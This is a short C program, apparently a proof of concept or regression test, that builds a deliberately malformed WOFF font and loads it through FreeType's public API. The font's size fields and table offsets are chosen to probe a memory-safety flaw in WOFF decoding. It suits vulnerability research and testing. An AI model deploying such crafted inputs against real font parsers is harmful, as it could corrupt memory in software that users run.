/*
 * Crafted WOFF font passed to FreeType through its public API.
 *
 * The font declares an SFNT size slightly above what its WOFF size
 * suggests, while the table directory places the first table entry
 * (processed in tag order) at the far end of the declared SFNT.
 */

#include <stdio.h>
#include <string.h>

#include <ft2build.h>
#include <freetype/freetype.h>


  static void
  put_long( FT_Byte*  p,
            FT_ULong  v )
  {
    p[0] = (FT_Byte)( v >> 24 );
    p[1] = (FT_Byte)( v >> 16 );
    p[2] = (FT_Byte)( v >>  8 );
    p[3] = (FT_Byte)( v       );
  }


  static void
  put_short( FT_Byte*  p,
             FT_UInt   v )
  {
    p[0] = (FT_Byte)( v >> 8 );
    p[1] = (FT_Byte)( v     );
  }


  static void
  put_table( FT_Byte*  p,
             FT_ULong  tag,
             FT_ULong  offset,
             FT_ULong  comp_length,
             FT_ULong  orig_length )
  {
    put_long ( p + 0,  tag         );
    put_long ( p + 4,  offset      );
    put_long ( p + 8,  comp_length );
    put_long ( p + 12, orig_length );
    put_long ( p + 16, 0           );
  }


  int
  main( void )
  {
    FT_Byte     woff[1024];
    FT_Library  library;
    FT_Face     face = NULL;
    FT_Error    error;


    /* WOFF header. */
    put_long ( woff + 0x00, 0x774F4646 );  /* signature      */
    put_long ( woff + 0x04, 0x00010000 );  /* flavor         */
    put_long ( woff + 0x08, 1024       );  /* length         */
    put_short( woff + 0x0C, 2          );  /* numTables      */
    put_short( woff + 0x0E, 0          );  /* reserved       */
    put_long ( woff + 0x10, 65600      );  /* totalSfntSize  */
    put_short( woff + 0x14, 1          );  /* majorVersion   */
    put_short( woff + 0x16, 0          );  /* minorVersion   */
    put_long ( woff + 0x18, 0          );  /* metaOffset     */
    put_long ( woff + 0x1C, 0          );  /* metaLength     */
    put_long ( woff + 0x20, 0          );  /* metaOrigLength */
    put_long ( woff + 0x24, 0          );  /* privOffset     */
    put_long ( woff + 0x28, 0          );  /* privLength     */

    /* Table directory (sorted by tag). */
    put_table( woff + 0x2C, 0x41414141, 1008, 16,   16     );
    put_table( woff + 0x40, 0x42424242, 84,   924,  65540  );

    /* Table data. */
    memset( woff + 84,   0xFF, 924 );
    memset( woff + 1008, 0x41, 16   );

    error = FT_Init_FreeType( &library );
    if ( error )
      return 1;

    error = FT_New_Memory_Face( library, woff, sizeof ( woff ), 0, &face );
    if ( error )
    {
      printf( "FT_New_Memory_Face failed with error 0x%x\n", error );
      FT_Done_FreeType( library );
      return 0;
    }

    printf( "FT_New_Memory_Face succeeded\n" );
    FT_Done_Face( face );
    FT_Done_FreeType( library );

    return 0;
  }


/* END */
